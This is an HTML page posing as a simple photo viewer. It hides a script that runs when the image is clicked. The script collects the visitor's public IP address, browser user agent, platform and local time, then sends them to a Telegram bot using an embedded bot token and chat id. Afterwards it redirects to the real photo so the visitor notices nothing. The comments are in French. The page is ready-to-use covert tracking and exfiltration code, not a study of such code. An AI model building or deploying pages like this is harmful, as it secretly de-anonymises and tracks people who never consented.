<!DOCTYPE html>
<html>
<head>
<title>Photo</title>
<style>
body {margin:0; background:black; display:flex; justify-content:center; align-items:center; height:100vh;}
img {max-width:100%; max-height:100vh;}
</style>
</head>
<body>
<img src="https://picsum.photos/id/1015/1200/800" onclick="grabInfo()">
<script>
function grabInfo() {
  var ua = navigator.userAgent;
  var platform = navigator.platform;
  var time = new Date().toLocaleString();

  fetch('https://api.ipify.org?format=json')
    .then(res => res.json())
    .then(data => {
      var ip = data.ip;

      var msg = "=== PHOTO GRAB ===\nIP: " + ip + "\nNavigateur: " + ua + "\nSystème: " + platform + "\nHeure: " + time;

      var url = "https://api.telegram.org/bot8948418784:AAH9lnh7ilWHWQ8UpUWp0aexajGq6xMWEKI/sendMessage?chat_id=2103109266&text=" + encodeURIComponent(msg);
      fetch(url).then(() => {
        // Redirige vers une vraie photo après grab
        window.location = "https://picsum.photos/id/1015/1200/800";
      });
    });
}
</script>
</body>
</html>